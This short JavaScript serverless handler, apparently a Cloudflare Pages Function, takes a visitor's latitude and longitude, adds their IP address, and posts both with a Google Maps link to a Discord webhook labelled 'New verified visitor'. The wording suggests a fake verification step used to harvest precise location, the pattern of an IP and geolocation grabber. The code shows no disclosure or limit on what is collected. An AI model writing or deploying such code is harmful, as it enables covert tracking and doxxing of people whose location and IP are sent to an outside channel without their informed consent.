export async function onRequestPost({ request, env }) {
  const data = await request.json();
  const lat = data.lat;
  const lon = data.lon;
  const ip = request.headers.get("cf-connecting-ip");

  if (!lat || !lon) {
    return new Response("Missing location", { status: 400 });
  }

  const msg = {
    content: `🌐 New verified visitor:
**IP:** ${ip}
**Latitude:** ${lat}
**Longitude:** ${lon}
📍 https://www.google.com/maps?q=${lat},${lon}`
  };

  await fetch(env.DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(msg)
  });

  return new Response("Logged", { status: 200 });
}